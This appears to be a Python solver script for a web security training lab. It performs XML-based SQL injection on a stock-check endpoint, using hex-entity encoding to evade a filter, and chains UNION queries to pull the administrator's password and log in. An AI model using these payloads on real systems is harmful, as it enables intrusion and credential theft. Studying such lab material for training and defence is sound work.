import sys
import logging
import urllib3
import re
import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


LOOK_UP = {
    " ": "&#x20;",
    "'": "&#x27;",
    "U": "&#x55;",
    "S": "&#x53;",
    "-": "&#x2d;",
    "=": "&#x3d;",
    ".": "&#x2e;",
    "W": "&#x57;",
}


def format_query(query):
    formatted_query = []
    for char in query:
        if char in LOOK_UP:
            char = LOOK_UP[char]
        formatted_query.append(char)
    return "".join(formatted_query)



def format_payload(query):
    formatted_query = format_query(query)
    return (
        '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId>'
        f"<storeId>1&#x20;{formatted_query}&#x2d;&#x2d;</storeId></stockCheck>"
)


def main(args):
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    url = shop.base_url + "product/stock"
    payload = format_payload(
        "UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
                             )
    log.info(f"Sending SQLi Payload: {payload}")
    
    if shop.no_proxy:
        resp = requests.post(url, data=payload)
    else:
        resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
    pattern = re.compile(r"(users)")
    m = pattern.search(resp.text)
    table_name = m[1]
    payload = format_payload(
        f"UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
    )
    log.info(f"Sending SQLi Payload: {payload}")
    
    if shop.no_proxy:
        resp = requests.post(url, data=payload)
    else:
        resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
    payload = format_payload(
        "UNION SELECT password FROM users where username='administrator'"
    )
    
    log.info(f"Sending SQLi Payload: {payload}")
    
    if shop.no_proxy:
        resp = requests.post(url, data=payload)
    else:
        resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
    password = resp.text
    print(f"The password is: {password}")
    shop.login("administrator", password)
    shop.is_solved()
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)
